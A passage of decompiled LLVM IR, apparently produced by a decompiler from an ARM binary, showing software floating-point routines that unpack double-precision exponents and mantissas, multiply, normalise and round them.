  %v5_19218 = urem i32 %v4_19218, 2048
  store i32 %v5_19218, i32* %r4.global-to-local, align 4
  %v6_19218 = icmp eq i32 %v5_19218, 0
  br i1 %v6_19218, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_1920c
  %v5_1921c = udiv i32 %arg4, 1048576
  %v6_1921c = urem i32 %v5_1921c, 2048
  store i32 %v6_1921c, i32* @r5, align 4
  %v7_1921c = icmp eq i32 %v6_1921c, 0
  br i1 %v7_1921c, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_19220 = icmp eq i32 %v5_19218, 2047
  br i1 %v5_19220, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_19224 = icmp eq i32 %v6_1921c, 2047
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1920c, %bb, %bb38, %bb39
  %v0_19228 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_19224, %bb39 ], [ true, %dec_label_pc_1920c ]
  store i32 ptrtoint (i32* @global_var_1922c.548 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_19228, i32 ptrtoint (i32* @global_var_19404.546 to i32))
  %v0_1922c = load i32, i32* %r4.global-to-local, align 4
  %v1_1922c = load i32, i32* @r5, align 4
  %v2_1922c = add i32 %v1_1922c, %v0_1922c
  store i32 %v2_1922c, i32* %r4.global-to-local, align 4
  %v2_19230 = xor i32 %arg4, %arg2
  %v1_19234 = load i32, i32* @ip, align 4
  %tmp51 = mul i32 %v1_19234, -2097152
  %v5_19234 = add i32 %tmp51, -1
  %v6_19234 = and i32 %v5_19234, %arg2
  store i32 %v6_19234, i32* %r1.global-to-local, align 4
  %v6_19238 = and i32 %v5_19234, %arg4
  %v5_1923c = mul i32 %arg2, 4096
  %v6_1923c = or i32 %v5_1923c, %tmp32
  store i32 %v6_1923c, i32* @r5, align 4
  %v8_1923c = icmp eq i32 %v6_1923c, 0
  br i1 %v8_1923c, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_192445 = or i32 %v6_19234, 1048576
  store i32 %v1_192445, i32* %r1.global-to-local, align 4
  %v1_192487 = or i32 %v6_19238, 1048576
  br label %dec_label_pc_192c8

bb40:                                             ; preds = %.thread2
  %v6_19240 = mul i32 %arg4, 4096
  %v7_19240 = or i32 %v6_19240, %arg3
  store i32 %v7_19240, i32* @r5, align 4
  %v9_19240 = icmp eq i32 %v7_19240, 0
  %v1_19244 = or i32 %v6_19234, 1048576
  store i32 %v1_19244, i32* %r1.global-to-local, align 4
  %v1_19248 = or i32 %v6_19238, 1048576
  br i1 %v9_19240, label %dec_label_pc_192c8, label %dec_label_pc_19250

dec_label_pc_19250:                               ; preds = %bb40
  %v6_19250 = mul nuw i64 %tmp, %arg1
  %v7_19250 = udiv i64 %v6_19250, 4294967296
  %v9_19250 = trunc i64 %v6_19250 to i32
  %v7_19258 = zext i32 %v1_19244 to i64
  %v11_19258 = mul nuw nsw i64 %v7_19258, %tmp
  %v12_19258 = add i64 %v11_19258, %v7_19250
  %v1_1925c = and i32 %v2_19230, -2147483648
  %v10_19260 = zext i32 %v1_19248 to i64
  %v11_19260 = mul nuw i64 %v10_19260, %arg1
  %v12_19260 = add i64 %v12_19258, %v11_19260
  %v13_19260 = udiv i64 %v12_19260, 4294967296
  %v15_19260 = trunc i64 %v12_19260 to i32
  %v10_19268 = mul nuw i64 %v10_19260, %v7_19258
  %v11_19268 = add i64 %v13_19260, %v10_19268
  %v12_19268 = udiv i64 %v11_19268, 4294967296
  %v13_19268 = trunc i64 %v12_19268 to i32
  %v14_19268 = trunc i64 %v11_19268 to i32
  %v2_1926c = icmp eq i32 %v9_19250, 0
  br i1 %v2_1926c, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_19250
  %v2_19270 = or i32 %v15_19260, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_19250, %bb41
  %storemerge = phi i32 [ %v2_19270, %bb41 ], [ %v15_19260, %dec_label_pc_19250 ]
  %v0_19284 = phi i32 [ %v2_19270, %bb41 ], [ %v15_19260, %dec_label_pc_19250 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_19274 = add i32 %v2_1922c, -255
  %v2_19278 = icmp ugt i32 %v13_19268, 511
  %v2_1927c = icmp eq i1 %v2_19278, false
  %v3_1927c = add i32 %v2_1922c, -1023
  %v5_1927c = sext i1 %v2_1927c to i32
  %v6_1927c = add i32 %v3_1927c, %v5_1927c
  store i32 %v6_1927c, i32* %r4.global-to-local, align 4
  %v3_19280 = icmp ugt i32 %v1_19274, 768
  br i1 %v3_19280, label %dec_label_pc_19290, label %dec_label_pc_19284

dec_label_pc_19284:                               ; preds = %bb42
  %v1_19284 = icmp slt i32 %v0_19284, 0
  %v2_19284 = mul i32 %v0_19284, 2
  store i32 %v2_19284, i32* %lr.global-to-local, align 4
  %v3_19288 = mul i32 %v14_19268, 2
  %v4_19288 = zext i1 %v1_19284 to i32
  %v5_19288 = or i32 %v4_19288, %v3_19288
  %v9_19288 = icmp ule i32 %v5_19288, %v14_19268
  %v10_19288 = icmp ult i32 %v3_19288, %v14_19268
  %v11_19288 = select i1 %v1_19284, i1 %v9_19288, i1 %v10_19288
  %v3_1928c25 = mul nuw nsw i64 %v12_19268, 2
  %v3_1928c = trunc i64 %v3_1928c25 to i32
  %v4_1928c = zext i1 %v11_19288 to i32
  %v5_1928c = or i32 %v4_1928c, %v3_1928c
  br label %dec_label_pc_19290

dec_label_pc_19290:                               ; preds = %bb42, %dec_label_pc_19284
  %v0_192a0 = phi i32 [ %v0_19284, %bb42 ], [ %v2_19284, %dec_label_pc_19284 ]
  %v0_19298 = phi i32 [ %v14_19268, %bb42 ], [ %v5_19288, %dec_label_pc_19284 ]
  %v1_19290 = phi i32 [ %v13_19268, %bb42 ], [ %v5_1928c, %dec_label_pc_19284 ]
  %v4_19290 = mul i32 %v1_19290, 2048
  %v4_19294 = udiv i32 %v0_19298, 2097152
  %v5_19290 = or i32 %v4_19294, %v1_1925c
  %v5_19294 = or i32 %v5_19290, %v4_19290
  store i32 %v5_19294, i32* %r1.global-to-local, align 4
  %v3_19298 = mul i32 %v0_19298, 2048
  %v4_1929c = udiv i32 %v0_192a0, 2097152
  %v5_1929c = or i32 %v3_19298, %v4_1929c
  store i32 %v5_1929c, i32* %r0.global-to-local, align 4
  %v3_192a0 = mul i32 %v0_192a0, 2048
  store i32 %v3_192a0, i32* %lr.global-to-local, align 4
  %v1_192a4 = add i32 %v6_1927c, -253
  store i32 %v1_192a4, i32* @ip, align 4
  %v2_192a4 = icmp ugt i32 %v6_1927c, 252
  %v7_192a4 = icmp eq i32 %v6_1927c, 253
  %v2_192a8 = xor i1 %v7_192a4, true
  %v3_192a8 = and i1 %v2_192a4, %v2_192a8
  br i1 %v3_192a8, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_19290
  %v6_192a8 = icmp ugt i32 %v1_192a4, 1791
  %v11_192a8 = icmp eq i32 %v1_192a4, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_19290, %bb43
  %v1_192ac = phi i1 [ %v7_192a4, %dec_label_pc_19290 ], [ %v11_192a8, %bb43 ]
  %v0_192ac = phi i1 [ %v2_192a4, %dec_label_pc_19290 ], [ %v6_192a8, %bb43 ]
  %v2_192ac = xor i1 %v1_192ac, true
  %v3_192ac = and i1 %v0_192ac, %v2_192ac
  call void @__pseudo_cond_branch(i1 %v3_192ac, i32 ptrtoint (i32* @global_var_192f8.547 to i32))
  %v0_192b0 = load i32, i32* %lr.global-to-local, align 4
  %v2_192b0 = icmp slt i32 %v0_192b0, 0
  %v6_192b0 = icmp eq i32 %v0_192b0, -2147483648
  %v1_192b4 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_192b0, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_192b4 = urem i32 %v1_192b4, 2
  %v3_192b4 = icmp ne i32 %v2_192b4, 0
  %v4_192b4 = udiv i32 %v1_192b4, 2
  store i32 %v4_192b4, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_192b8 = phi i1 [ %v3_192b4, %bb45 ], [ %v2_192b0, %bb44 ]
  %v2_192b8 = zext i1 %v1_192b8 to i32
  %v3_192b8 = add i32 %v2_192b8, %v1_192b4
  store i32 %v3_192b8, i32* %r0.global-to-local, align 4
  %v0_192bc = load i32, i32* %r1.global-to-local, align 4
  %v1_192bc = load i32, i32* %r4.global-to-local, align 4
  %v2_192bc = and i32 %v1_192bc, 4096
  %v3_192bc = icmp ne i32 %v2_192bc, 0
  %v4_192bc = mul i32 %v1_192bc, 1048576
  %v6_192bc = add i32 %v4_192bc, %v0_192bc
  %v7_192bc = zext i1 %v3_192bc to i32
  %v8_192bc = add i32 %v7_192bc, %v6_192bc
  store i32 %v8_192bc, i32* %r1.global-to-local, align 4
  %v2_192c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_192c0, i32* @r4, align 4
  store i32 %v6_1920c, i32* @r5, align 4
  store i32 %v9_1920c, i32* @r6, align 4
  store i32 %v12_1920c, i32* @lr, align 4
  ret i32 %v3_192b8

dec_label_pc_192c8:                               ; preds = %.thread3, %bb40
  %v1_192d4 = phi i32 [ %v1_192487, %.thread3 ], [ %v1_19248, %bb40 ]
  %v1_192cc = phi i32 [ %v1_192445, %.thread3 ], [ %v1_19244, %bb40 ]
  %v1_192c8 = and i32 %v2_19230, -2147483648
  store i32 %v1_192c8, i32* @r6, align 4
  %v2_192cc = or i32 %v1_192cc, %v1_192c8
  %v4_192d01 = or i64 %tmp, %arg1
  %v4_192d0 = trunc i64 %v4_192d01 to i32
  store i32 %v4_192d0, i32* %r0.global-to-local, align 4
  %v2_192d4 = xor i32 %v2_192cc, %v1_192d4
  store i32 %v2_192d4, i32* %r1.global-to-local, align 4
  %v4_192d8 = udiv i32 %v1_19234, 2
  %v5_192d8 = sub i32 %v2_1922c, %v4_192d8
  store i32 %v5_192d8, i32* %r4.global-to-local, align 4
  %v7_192d8 = sub i32 0, %v5_192d8
  %v8_192d8 = and i32 %v2_1922c, %v7_192d8
  %v11_192d8 = icmp eq i32 %v2_1922c, %v4_192d8
  %v7_192dc = icmp sgt i32 %v2_1922c, %v4_192d8
  br i1 %v7_192dc, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_192c8
  %v10_192dc = sub i32 %v1_19234, %v5_192d8
  store i32 %v10_192dc, i32* @r5, align 4
  %v12_192dc = xor i32 %v5_192d8, %v1_19234
  %v13_192dc = xor i32 %v10_192dc, %v1_19234
  %v14_192dc = and i32 %v13_192dc, %v12_192dc
  %v17_192dc = icmp eq i32 %v1_19234, %v5_192d8
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_192c8, %bb46
  %v3_192e8.in = phi i32 [ %v8_192d8, %dec_label_pc_192c8 ], [ %v14_192dc, %bb46 ]
  %v2_192e8.in = phi i32 [ %v5_192d8, %dec_label_pc_192c8 ], [ %v10_192dc, %bb46 ]
  %v1_192e8 = phi i1 [ %v11_192d8, %dec_label_pc_192c8 ], [ %v17_192dc, %bb46 ]
  %v2_192e8 = icmp slt i32 %v2_192e8.in, 0
  %v3_192e8 = icmp slt i32 %v3_192e8.in, 0
  %v3_192e0 = xor i1 %v3_192e8, %v2_192e8
  %v4_192e0 = or i1 %v1_192e8, %v3_192e0
  br i1 %v4_192e0, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_192e8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_192e030 = mul i32 %v5_192d8, 1048576
  %v10_192e031 = or i32 %v2_192d4, %v9_192e030
  store i32 %v10_192e031, i32* %r1.global-to-local, align 4
  %v7_192e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_192e4, i32* %r4.global-to-local, align 4
  store i32 %v6_1920c, i32* @r5, align 4
  store i32 %v9_1920c, i32* @r6, align 4
  store i32 %v12_1920c, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_192e8 = phi i32 [ %v0_192e8.pre, %._crit_edge23 ], [ %v12_1920c, %bb48 ]
  %v6_192e8 = xor i1 %v4_192e0, true
  call void @__pseudo_cond_branch(i1 %v6_192e8, i32 %v0_192e8)
  %v0_192ec = load i32, i32* %r1.global-to-local, align 4
  %v1_192ec = or i32 %v0_192ec, 1048576
  store i32 %v1_192ec, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_192f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_192f4 = add i32 %v0_192f4, -1
  store i32 %v1_192f4, i32* @r4, align 4
  ret i32 %v4_192d0

; uselistorder directives
  uselistorder i32 %v5_192d8, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_192d8, { 2, 1, 0 }
  uselistorder i32 %v1_192b4, { 2, 0, 1 }
  uselistorder i32 %v0_192b0, { 1, 0 }
  uselistorder i1 %v7_192a4, { 1, 0 }
  uselistorder i32 %v2_19284, { 1, 0 }
  uselistorder i1 %v1_19284, { 1, 0 }
  uselistorder i32 %v6_1927c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_19284, { 1, 0, 2 }
  uselistorder i32 %v14_19268, { 1, 3, 2, 0 }
  uselistorder i64 %v11_19268, { 1, 0 }
  uselistorder i64 %v12_19260, { 1, 0 }
  uselistorder i64 %v10_19260, { 1, 0 }
  uselistorder i64 %v7_19258, { 1, 0 }
  uselistorder i64 %v6_19250, { 1, 0 }
  uselistorder i32 %v6_19238, { 1, 0 }
  uselistorder i32 %v6_19234, { 1, 0, 2 }
  uselistorder i32 %v1_19234, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1922c, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1921c, { 2, 1, 0 }
  uselistorder i32 %v5_19218, { 2, 1, 0 }
  uselistorder i32 %v12_1920c, { 0, 2, 1 }
  uselistorder i32 %v9_1920c, { 1, 0 }
  uselistorder i32 %v6_1920c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 8, 9, 2, 3, 4, 5, 6, 10, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 6, 2, 3, 4, 5, 0, 7 }
  uselistorder i32 -253, { 2, 0, 1 }
  uselistorder i32 -255, { 6, 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_192c8, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_19290, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_192f8() local_unnamed_addr {
dec_label_pc_192f8:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_192f8 = load i1, i1* @cpsr_z, align 1
  %v1_192f8 = load i1, i1* @cpsr_n, align 1
  %v2_192f8 = load i1, i1* @cpsr_v, align 1
  %v3_192f8 = xor i1 %v1_192f8, %v2_192f8
  %v4_192f8 = or i1 %v0_192f8, %v3_192f8
  br i1 %v4_192f8, label %dec_label_pc_192fc, label %dec_label_pc_19474

dec_label_pc_192fc:                               ; preds = %dec_label_pc_192f8
  %v0_192fc = load i32, i32* @r4, align 4
  %v4_192fc = add i32 %v0_192fc, 54
  %v6_192fc = sub i32 0, %v0_192fc
  %v7_192fc = and i32 %v4_192fc, %v6_192fc
  %v8_192fc = icmp slt i32 %v7_192fc, 0
  %v9_192fc = icmp slt i32 %v4_192fc, 0
  %v10_192fc = icmp eq i32 %v4_192fc, 0
  %v7_19300 = icmp sgt i32 %v0_192fc, -54
  br i1 %v7_19300, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_192fc
  store i32 0, i32* @r0, align 4
  %v8_19304 = load i32, i32* @r1, align 4
  %v9_19304 = and i32 %v8_19304, -2147483648
  store i32 %v9_19304, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_192fc, %bb
  %v4_1930c = xor i1 %v9_192fc, %v8_192fc
  %v5_1930c = or i1 %v10_192fc, %v4_1930c
  call void @__pseudo_cond_branch(i1 %v5_1930c, i32 %tmp7)
  %v0_19310 = load i32, i32* @r4, align 4
  %v1_19310 = sub i32 0, %v0_19310
  %v2_19314 = sub i32 -32, %v0_19310
  %v4_19314 = add i32 %v0_19310, 31
  %v5_19314 = and i32 %v4_19314, %v1_19310
  %v6_19314 = icmp slt i32 %v5_19314, 0
  store i1 %v6_19314, i1* @cpsr_v, align 1
  %v6_19318 = icmp slt i32 %v1_19310, 32
  br i1 %v6_19318, label %dec_label_pc_1931c, label %dec_label_pc_19388

dec_label_pc_1931c:                               ; preds = %.thread1
  %v1_1931c = add i32 %v2_19314, 12
  %v8_19320 = icmp sgt i32 %v1_1931c, 0
  br i1 %v8_19320, label %dec_label_pc_19358, label %dec_label_pc_19324

dec_label_pc_19324:                               ; preds = %dec_label_pc_1931c
  %v1_19324 = add i32 %v2_19314, 32
  %v1_19328 = sub i32 0, %v2_19314
  %v0_1932c = load i32, i32* @r0, align 4
  %v6_1932c = shl i32 %v0_1932c, %v1_19328
  store i32 %v6_1932c, i32* @r3, align 4
  %v2_19330 = add i32 %v2_19314, 31
  %v3_19330 = shl i32 1, %v2_19330
  %v6_19330 = lshr i32 %v0_1932c, %v1_19324
  %v1_19334 = load i32, i32* @r1, align 4
  %v7_19334 = shl i32 %v1_19334, %v1_19328
  %v8_19334 = or i32 %v7_19334, %v6_19330
  %v1_19338 = and i32 %v1_19334, -2147483648
  store i32 %v1_19338, i32* @r2, align 4
  %tmp = bitcast i32 %v1_19334 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1933c = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1932c, 0
  %v4_19340 = zext i1 %tmp20 to i32
  %v5_19340 = add i32 %v8_19334, %v4_19340
  %v5_19344 = and i32 %v1_1933c, %v3_19330
  %v6_19344 = icmp ne i32 %v5_19344, 0
  %v7_19344 = lshr i32 %v1_1933c, %v1_19324
  %v9_19344 = add i32 %v7_19344, %v1_19338
  %v10_19344 = zext i1 %v6_19344 to i32
  %v11_19344 = add i32 %v9_19344, %v10_19344
  store i32 %v11_19344, i32* @r1, align 4
  %v19_19344 = add i32 %v11_19344, %v10_19344
  %v20_19344 = xor i32 %v19_19344, %v1_19334
  %v21_19344 = xor i32 %v19_19344, %v7_19344
  %v22_19344 = and i32 %v20_19344, %v21_19344
  %v23_19344 = icmp slt i32 %v22_19344, 0
  store i1 %v23_19344, i1* @cpsr_v, align 1
  %v3_19348 = mul i32 %v6_1932c, 2
  %v4_19348 = or i32 %v3_19348, %tmp7
  %v5_19348 = icmp slt i32 %v4_19348, 0
  store i1 %v5_19348, i1* @cpsr_n, align 1
  %v6_19348 = icmp eq i32 %v4_19348, 0
  store i1 %v6_19348, i1* @cpsr_z, align 1
  br i1 %v6_19348, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_19324
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1934c = add nsw i32 %tmp21, -1
  %v7_1934c = and i32 %v5_19340, %v6_1934c
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_19324, %bb13
  %v1_19354 = phi i32 [ %v5_19340, %dec_label_pc_19324 ], [ %v7_1934c, %bb13 ]
  %v2_19350 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_19350, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_19354

dec_label_pc_19358:                               ; preds = %dec_label_pc_1931c
  %v1_19358 = sub i32 0, %v2_19314
  %v1_1935c = add i32 %v2_19314, 32
  %v0_19360 = load i32, i32* @r0, align 4
  %v6_19360 = shl i32 %v0_19360, %v1_19358
  store i32 %v6_19360, i32* @r3, align 4
  %v6_19364 = lshr i32 %v0_19360, %v1_1935c
  %v1_19368 = load i32, i32* @r1, align 4
  %v7_19368 = shl i32 %v1_19368, %v1_19358
  %v8_19368 = or i32 %v7_19368, %v6_19364
  %v1_1936c = and i32 %v1_19368, -2147483648
  %tmp22 = icmp slt i32 %v6_19360, 0
  %v4_19370 = zext i1 %tmp22 to i32
  %v5_19370 = add i32 %v8_19368, %v4_19370
  %v6_19370 = icmp ult i32 %v5_19370, %v8_19368
  %v2_19374 = zext i1 %v6_19370 to i32
  %v3_19374 = or i32 %v2_19374, %v1_1936c
  store i32 %v3_19374, i32* @r1, align 4
  %v9_19374 = add nsw i32 %v3_19374, %v2_19374
  %v10_19374 = sub i32 0, %v1_19368
  %v11_19374 = and i32 %v9_19374, %v10_19374
  %v12_19374 = icmp slt i32 %v11_19374, 0
  store i1 %v12_19374, i1* @cpsr_v, align 1
  %v3_19378 = mul i32 %v6_19360, 2
  %v4_19378 = or i32 %v3_19378, %tmp7
  %v5_19378 = icmp slt i32 %v4_19378, 0
  store i1 %v5_19378, i1* @cpsr_n, align 1
  %v6_19378 = icmp eq i32 %v4_19378, 0
  store i1 %v6_19378, i1* @cpsr_z, align 1
  br i1 %v6_19378, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_19358
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1937c = add nsw i32 %tmp23, -1
  %v7_1937c = and i32 %v5_19370, %v6_1937c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_19358, %bb15
  %v1_19384 = phi i32 [ %v5_19370, %dec_label_pc_19358 ], [ %v7_1937c, %bb15 ]
  %v2_19380 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_19380, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_19384

dec_label_pc_19388:                               ; preds = %.thread1
  %v1_19388 = sub i32 32, %v2_19314
  %v1_1938c = load i32, i32* @r0, align 4
  %v7_1938c = shl i32 %v1_1938c, %v1_19388
  %v8_1938c = or i32 %v7_1938c, %tmp7
  %v6_19390 = lshr i32 %v1_1938c, %v2_19314
  %v1_19394 = load i32, i32* @r1, align 4
  %v7_19394 = shl i32 %v1_19394, %v1_19388
  %v8_19394 = or i32 %v7_19394, %v6_19390
  store i32 %v8_19394, i32* @r3, align 4
  %v6_19398 = lshr i32 %v1_19394, %v2_19314
  %v1_1939c = and i32 %v1_19394, -2147483648
  store i32 %v1_1939c, i32* @r1, align 4
  %v7_193a0 = lshr i32 %v1_1939c, %v2_19314
  %v8_193a0 = sub i32 -1, %v7_193a0
  %v9_193a0 = and i32 %v6_19398, %v8_193a0
  %tmp24 = icmp slt i32 %v8_19394, 0
  %v4_193a4 = zext i1 %tmp24 to i32
  %v5_193a4 = add i32 %v4_193a4, %v9_193a0
  %v3_193a8 = mul i32 %v8_19394, 2
  %v4_193a8 = or i32 %v8_1938c, %v3_193a8
  %v5_193a8 = icmp slt i32 %v4_193a8, 0
  store i1 %v5_193a8, i1* @cpsr_n, align 1
  %v6_193a8 = icmp eq i32 %v4_193a8, 0
  store i1 %v6_193a8, i1* @cpsr_z, align 1
  br i1 %v6_193a8, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_19388
  %tmp25 = sext i1 %tmp24 to i32
  %v6_193ac = add nsw i32 %tmp25, -1
  %v7_193ac = and i32 %v5_193a4, %v6_193ac
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_19388, %bb17
  %v1_193b4 = phi i32 [ %v5_193a4, %dec_label_pc_19388 ], [ %v7_193ac, %bb17 ]
  %v2_193b0 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_193b0, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_193b4

dec_label_pc_19474:                               ; preds = %dec_label_pc_192f8
  %v0_19474 = load i32, i32* @r1, align 4
  %v1_19474 = and i32 %v0_19474, -2147483648
  %v1_1947c = or i32 %v1_19474, 2146435072
  store i32 %v1_1947c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_193a4, { 1, 0 }
  uselistorder i32 %v5_19370, { 1, 0, 2 }
  uselistorder i32 %v8_19368, { 1, 0 }
  uselistorder i32 %v1_19358, { 1, 0 }
  uselistorder i32 %v5_19340, { 1, 0 }
  uselistorder i32 %v1_19334, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19328, { 1, 0 }
  uselistorder i32 %v2_19314, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_19310, { 1, 0 }
  uselistorder i32 %v4_192fc, { 1, 2, 0 }
  uselistorder i32 %v0_192fc, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 50, 51, 10, 27, 11, 12, 28, 33, 34, 35, 36, 37, 13, 38, 39, 14, 9, 126, 127, 128, 129, 130, 132, 133, 131, 134, 135, 136, 137, 138, 139, 140, 15, 16, 17, 18, 20, 19, 21, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 40, 41, 22, 23, 42, 43, 44, 45, 46, 29, 30, 24, 31, 32, 47, 72, 86, 48, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 0, 25, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 122, 115, 116, 117, 118, 119, 120, 121, 123, 124, 26, 125, 49, 1, 65, 66, 67, 68, 69, 70, 71, 73, 3, 74, 8, 75, 76, 2, 77, 78, 7, 79, 80, 6, 81, 5, 4, 82, 83, 84, 85 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 0, 8, 2, 9, 1, 10 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1948c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1948c:
  %v1_19490 = or i32 %arg1, 2146959360
  store i32 %v1_19490, i32* @r1, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_19498 = load i32, i32* @r0, align 4
  ret i32 %v1_19498
}

define i32 @function_1949c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1949c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1949c = load i32, i32* @r4, align 4
  store i32 %v3_1949c, i32* %stack_var_-16, align 4
  %v6_1949c = load i32, i32* @r5, align 4
  %v9_1949c = load i32, i32* @r6, align 4
  %v12_1949c = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_194a8 = load i32, i32* @r1, align 4
  %v4_194a8 = udiv i32 %v1_194a8, 1048576
  %v5_194a8 = urem i32 %v4_194a8, 2048
  store i32 %v5_194a8, i32* @r4, align 4
  %v6_194a8 = icmp eq i32 %v5_194a8, 0
  br i1 %v6_194a8, label %dec_label_pc_1949c..thread2_crit_edge, label %bb

dec_label_pc_1949c..thread2_crit_edge:            ; preds = %dec_label_pc_1949c
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_1949c
  %v5_194ac = udiv i32 %arg4, 1048576
  %v6_194ac = urem i32 %v5_194ac, 2048
  store i32 %v6_194ac, i32* %r5.global-to-local, align 4
  %v7_194ac = icmp eq i32 %v6_194ac, 0
  br i1 %v7_194ac, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_19638

bb90:                                             ; preds = %bb
  %v5_194b0 = icmp eq i32 %v5_194a8, 2047
  br i1 %v5_194b0, label %.thread2, label %bb91

.thread2:                                         ; preds = %dec_label_pc_1949c..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %dec_label_pc_1949c..thread2_crit_edge ], [ %v5_194ac, %bb90 ]
  br label %dec_label_pc_19638

bb91:                                             ; preds = %bb90
  %v5_194b4 = icmp eq i32 %v6_194ac, 2047
  br i1 %v5_194b4, label %dec_label_pc_19638, label %dec_label_pc_194bc

dec_label_pc_194bc:                               ; preds = %bb91
  %v2_194bc = sub nsw i32 %v5_194a8, %v6_194ac
  store i32 %v2_194bc, i32* %r4.global-to-local, align 4
  %v2_194c0 = xor i32 %v1_194a8, %arg4
